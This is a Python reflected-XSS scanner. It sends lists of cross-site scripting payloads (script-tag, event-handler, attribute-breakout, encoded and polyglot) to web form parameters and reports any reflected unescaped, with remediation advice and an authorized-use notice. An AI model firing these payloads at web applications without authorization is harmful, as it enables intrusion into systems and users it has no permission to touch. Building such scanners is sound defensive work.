"""
Cross-Site Scripting (XSS) Vulnerability Scanner
===================================================
Detects reflected XSS vulnerabilities by injecting payloads into
input fields and URL parameters, then checking if payloads appear
unescaped in the response.

Detection Methods:
- Basic script tag injection
- Event handler injection (onerror, onload, onmouseover, etc.)
- SVG/IMG/IFRAME tag-based payloads
- HTML attribute injection
- JavaScript protocol handler injection
- Encoded and obfuscated payloads
- Context-aware payload selection (HTML, attribute, JavaScript)

OWASP Reference: A03:2021 - Injection (specifically A07:2017 - XSS)
CWE Reference: CWE-79 (Cross-site Scripting)

ETHICAL USE ONLY: Only test systems you own or have written authorization to test.
"""

import re
import time
import html
import requests
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from urllib.parse import urljoin, quote, unquote


@dataclass
class XSSFinding:
    """Represents a cross-site scripting finding."""
    url: str
    parameter: str
    payload: str
    method: str
    xss_type: str  # reflected, dom-based, stored
    severity: str
    evidence: str
    context: str  # html-body, html-attribute, javascript, url
    description: str
    remediation: str
    owasp_category: str = 'A03:2021 - Injection'
    cwe_id: str = 'CWE-79'


@dataclass
class XSSScanResult:
    """Complete result of an XSS scan."""
    target_url: str
    findings: List[XSSFinding] = field(default_factory=list)
    endpoints_tested: int = 0
    payloads_sent: int = 0
    vulnerabilities_found: int = 0
    scan_duration: float = 0.0
    errors: List[str] = field(default_factory=list)


# -----------------------------------------------------------------------
# XSS Payloads organized by category
# -----------------------------------------------------------------------

# Basic script tag payloads
SCRIPT_TAG_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '<script>prompt("XSS")</script>',
    '<script>confirm("XSS")</script>',
    '<script>document.write("XSS")</script>',
    '<SCRIPT>alert("XSS")</SCRIPT>',
    '<scr<script>ipt>alert("XSS")</scr</script>ipt>',
    '<script/src="data:text/javascript,alert(1)">',
]

# Event handler payloads
EVENT_HANDLER_PAYLOADS = [
    '<img src=x onerror=alert("XSS")>',
    '<img src=x onerror="alert(1)">',
    '<img/src=x onerror=alert(1)>',
    '<svg onload=alert("XSS")>',
    '<svg/onload=alert(1)>',
    '<body onload=alert("XSS")>',
    '<input onfocus=alert("XSS") autofocus>',
    '<marquee onstart=alert("XSS")>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src>">',
]

# HTML attribute injection payloads
ATTRIBUTE_PAYLOADS = [
    '" onmouseover="alert(1)" x="',
    "' onmouseover='alert(1)' x='",
    '" onfocus="alert(1)" autofocus="',
    "' onfocus='alert(1)' autofocus='",
    '"><script>alert(1)</script>',
    "'>><script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    "' onclick='alert(1)' x='",
]

# JavaScript context payloads
JS_CONTEXT_PAYLOADS = [
    "';alert(1);//",
    '";alert(1);//',
    "'-alert(1)-'",
    '"-alert(1)-"',
    "\\';alert(1);//",
    '</script><script>alert(1)</script>',
    "javascript:alert(1)",
    "java\tscript:alert(1)",
]

# Encoded payloads
ENCODED_PAYLOADS = [
    '%3Cscript%3Ealert(1)%3C%2Fscript%3E',
    '&#60;script&#62;alert(1)&#60;/script&#62;',
    '&lt;script&gt;alert(1)&lt;/script&gt;',
    '%22%3E%3Cscript%3Ealert(1)%3C/script%3E',
    '<scr%00ipt>alert(1)</scr%00ipt>',
    '\x3cscript\x3ealert(1)\x3c/script\x3e',
]

# Polyglot payloads (work in multiple contexts)
POLYGLOT_PAYLOADS = [
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//",
    '"><svg/onload=alert(1)//',
    "'-alert(1)-'",
    "<svg/onload=alert(1)>",
]

# Unique marker for detection
XSS_MARKER = 'XSS_SCANNER_PROBE_'
MARKER_COUNTER = 0


def _generate_marker() -> str:
    """Generate a unique marker for payload tracking."""
    global MARKER_COUNTER
    MARKER_COUNTER += 1
    return f"{XSS_MARKER}{MARKER_COUNTER}"


def _get_all_payloads() -> List[Tuple[str, str]]:
    """
    Get all payloads with their categories.

    Returns:
        List of (payload, category) tuples
    """
    payloads = []
    for p in SCRIPT_TAG_PAYLOADS:
        payloads.append((p, 'script-tag'))
    for p in EVENT_HANDLER_PAYLOADS:
        payloads.append((p, 'event-handler'))
    for p in ATTRIBUTE_PAYLOADS:
        payloads.append((p, 'attribute-injection'))
    for p in JS_CONTEXT_PAYLOADS:
        payloads.append((p, 'javascript-context'))
    for p in ENCODED_PAYLOADS:
        payloads.append((p, 'encoded'))
    for p in POLYGLOT_PAYLOADS:
        payloads.append((p, 'polyglot'))
    return payloads


def _check_reflection(response_text: str, payload: str) -> Tuple[bool, str]:
    """
    Check if the payload is reflected in the response.

    Returns:
        (is_reflected, context) tuple
    """
    # Check for direct reflection (unencoded)
    if payload in response_text:
        # Determine the context
        context = _determine_context(response_text, payload)
        return True, context

    # Check for partially decoded reflection
    decoded_payload = unquote(payload)
    if decoded_payload != payload and decoded_payload in response_text:
        context = _determine_context(response_text, decoded_payload)
        return True, context

    # Check for HTML entity decoded reflection
    html_decoded = html.unescape(payload)
    if html_decoded != payload and html_decoded in response_text:
        context = _determine_context(response_text, html_decoded)
        return True, context

    return False, ''


def _determine_context(response_text: str, payload: str) -> str:
    """Determine the context where the payload is reflected."""
    idx = response_text.find(payload)
    if idx == -1:
        return 'unknown'

    # Get surrounding text for context analysis
    start = max(0, idx - 100)
    end = min(len(response_text), idx + len(payload) + 100)
    surrounding = response_text[start:end].lower()

    # Check if inside a script tag
    if '<script' in surrounding and '</script>' in surrounding:
        return 'javascript'

    # Check if inside an HTML attribute
    before_payload = response_text[start:idx].lower()
    if '="' in before_payload[-30:] or "='" in before_payload[-30:]:
        return 'html-attribute'

    # Check if inside a style tag
    if '<style' in surrounding:
        return 'css'

    # Check if inside a comment
    if '<!--' in before_payload and '-->' not in before_payload:
        return 'html-comment'

    # Default to HTML body context
    return 'html-body'


def _test_reflected_xss(
    url: str,
    param_name: str,
    method: str = 'POST',
    additional_params: Optional[Dict] = None,
    timeout: int = 10,
    verbose: bool = False
) -> List[XSSFinding]:
    """
    Test a single parameter for reflected XSS.

    Args:
        url: Target URL
        param_name: Parameter name to test
        method: HTTP method (GET or POST)
        additional_params: Additional form parameters to include
        timeout: Request timeout
        verbose: Verbose output

    Returns:
        List of XSSFinding objects
    """
    findings = []
    all_payloads = _get_all_payloads()

    for payload, category in all_payloads:
        try:
            # Build the request parameters
            params = {param_name: payload}
            if additional_params:
                params.update(additional_params)

            if method.upper() == 'POST':
                response = requests.post(
                    url,
                    data=params,
                    timeout=timeout,
                    allow_redirects=False
                )
            else:
                response = requests.get(
                    url,
                    params=params,
                    timeout=timeout,
                    allow_redirects=False
                )

            # Check if payload is reflected
            is_reflected, context = _check_reflection(response.text, payload)

            if is_reflected:
                # Determine severity based on context
                if context in ('html-body', 'javascript'):
                    severity = 'High'
                elif context == 'html-attribute':
                    severity = 'High'
                else:
                    severity = 'Medium'

                finding = XSSFinding(
                    url=url,
                    parameter=param_name,
                    payload=payload,
                    method=method,
                    xss_type='reflected',
                    severity=severity,
                    evidence=(
                        f"Payload reflected unescaped in {context} context. "
                        f"Category: {category}."
                    ),
                    context=context,
                    description=(
                        f"Reflected XSS vulnerability found in parameter "
                        f"'{param_name}'. The payload '{payload[:50]}...' is "
                        f"reflected in the response without proper encoding "
                        f"in the {context} context. An attacker can craft a "
                        f"malicious URL that executes JavaScript in the victim's "
                        f"browser, potentially stealing session cookies, "
                        f"credentials, or performing actions on behalf of the user."
                    ),
                    remediation=(
                        "Implement context-aware output encoding: "
                        "HTML entity encoding for HTML body, "
                        "attribute encoding for HTML attributes, "
                        "JavaScript encoding for JavaScript contexts. "
                        "Deploy a strict Content-Security-Policy header. "
                        "Use template engines with auto-escaping enabled. "
                        "Validate and sanitize all user input on the server side."
                    ),
                )
                findings.append(finding)

                if verbose:
                    print(f"  [!] XSS FOUND ({category}): {param_name}")
                    print(f"      Payload: {payload[:60]}")
                    print(f"      Context: {context}")

                # Found one in this category, continue to next category
                continue

            if verbose and category in ('script-tag', 'event-handler'):
                print(f"  [.] Tested ({category}): {payload[:50]}...")

        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"  [!] Request error: {str(e)[:60]}")

    return findings


def scan_xss(
    target_url: str,
    endpoints: Optional[List[Dict]] = None,
    timeout: int = 10,
    verbose: bool = False
) -> XSSScanResult:
    """
    Run a comprehensive XSS scan against the target.

    Args:
        target_url: Base URL of the target application
        endpoints: List of endpoint configurations to test.
                   Each dict: {path, method, params: [param_names],
                               additional_params: {}}
                   If None, uses default endpoints.
        timeout: Request timeout in seconds
        verbose: Enable verbose output

    Returns:
        XSSScanResult with all findings
    """
    start_time = time.time()

    result = XSSScanResult(target_url=target_url)

    # Default endpoints to test
    if endpoints is None:
        endpoints = [
            {
                'path': '/search',
                'method': 'POST',
                'params': ['query'],
                'additional_params': {},
            },
            {
                'path': '/search',
                'method': 'GET',
                'params': ['q'],
                'additional_params': {},
            },
        ]

    total_payloads = len(_get_all_payloads())

    print("[*] Starting XSS scan...")
    print(f"[*] Target: {target_url}")
    print(f"[*] Endpoints to test: {len(endpoints)}")
    print(f"[*] Payloads per parameter: {total_payloads}")
    print()

    for endpoint in endpoints:
        url = urljoin(target_url, endpoint['path'])
        method = endpoint.get('method', 'POST')
        params = endpoint.get('params', [])
        additional = endpoint.get('additional_params', {})

        result.endpoints_tested += 1

        print(f"[*] Testing: {method} {url}")
        print(f"    Parameters: {', '.join(params)}")

        for param in params:
            print(f"  [*] Testing parameter: {param}")
            param_findings = _test_reflected_xss(
                url=url,
                param_name=param,
                method=method,
                additional_params=additional,
                timeout=timeout,
                verbose=verbose,
            )
            result.findings.extend(param_findings)
            result.payloads_sent += total_payloads

        print()

    result.vulnerabilities_found = len(result.findings)
    result.scan_duration = time.time() - start_time

    print(f"[*] XSS scan complete")
    print(f"[*] Duration: {result.scan_duration:.2f}s")
    print(f"[*] Payloads sent: {result.payloads_sent}")
    print(f"[*] Vulnerabilities found: {result.vulnerabilities_found}")

    return result


def get_unique_findings(result: XSSScanResult) -> List[XSSFinding]:
    """
    Deduplicate findings by parameter and context.
    Returns only unique parameter/context combinations.
    """
    seen = set()
    unique = []
    for finding in result.findings:
        key = (finding.url, finding.parameter, finding.context)
        if key not in seen:
            seen.add(key)
            unique.append(finding)
    return unique


if __name__ == '__main__':
    import sys

    target = sys.argv[1] if len(sys.argv) > 1 else 'http://127.0.0.1:5000'
    result = scan_xss(target, verbose='--verbose' in sys.argv)

    if result.findings:
        unique = get_unique_findings(result)
        print("\n" + "=" * 60)
        print("  XSS FINDINGS (Deduplicated)")
        print("=" * 60)
        for i, finding in enumerate(unique, 1):
            print(f"\n  Finding #{i}")
            print(f"  Type: {finding.xss_type}")
            print(f"  Severity: {finding.severity}")
            print(f"  URL: {finding.url}")
            print(f"  Parameter: {finding.parameter}")
            print(f"  Context: {finding.context}")
            print(f"  Payload: {finding.payload[:60]}")
            print(f"  Evidence: {finding.evidence}")
